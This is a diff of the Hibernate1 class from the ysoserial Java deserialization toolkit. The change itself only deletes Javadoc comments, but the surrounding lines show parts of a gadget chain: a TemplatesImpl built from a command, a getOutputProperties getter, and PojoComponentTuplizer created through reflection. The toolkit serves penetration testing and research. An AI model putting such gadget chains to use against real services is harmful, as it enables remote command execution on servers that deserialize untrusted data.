@@ -94,11 +94,6 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {
     }
 
 
-    /**
-     * {@inheritDoc}
-     *
-     * @see ysoserial.payloads.ObjectPayload#getObject(java.lang.String)
-     */
     public Object getObject ( String command ) throws Exception {
         Object tpl = Gadgets.createTemplatesImpl(command);
         Object getters = makeGetter(tpl.getClass(), "getOutputProperties");
@@ -106,18 +101,6 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {
     }
 
 
-    /**
-     * @param tpl
-     * @param getters
-     * @return
-     * @throws NoSuchMethodException
-     * @throws InstantiationException
-     * @throws IllegalAccessException
-     * @throws InvocationTargetException
-     * @throws NoSuchFieldException
-     * @throws Exception
-     * @throws ClassNotFoundException
-     */
     static Object makeCaller ( Object tpl, Object getters ) throws NoSuchMethodException, InstantiationException, IllegalAccessException,
             InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException {
         PojoComponentTuplizer tup = Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
